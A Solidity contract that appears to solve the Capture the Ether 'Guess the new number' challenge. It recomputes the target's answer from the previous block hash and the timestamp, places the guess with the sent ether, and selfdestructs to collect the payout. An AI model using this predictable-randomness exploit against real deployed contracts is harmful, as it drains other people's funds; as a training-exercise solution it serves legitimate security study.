// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "hardhat/console.sol";

import "../../../Exercise/CaptureTheEther/3/GuessTheNewNumberChallenge.sol";


contract AttackGuessNewNumber {
    GuessTheNewNumberChallenge guessTheNewNumberChallenge;

    function AttackGuessNewNumber(GuessTheNewNumberChallenge importingContract) payable {
        guessTheNewNumberChallenge = importingContract;
    }

    function() public payable{}

    function attack() external payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessTheNewNumberChallenge.guess.value(msg.value)(answer);
        selfdestruct(msg.sender);
    }

}
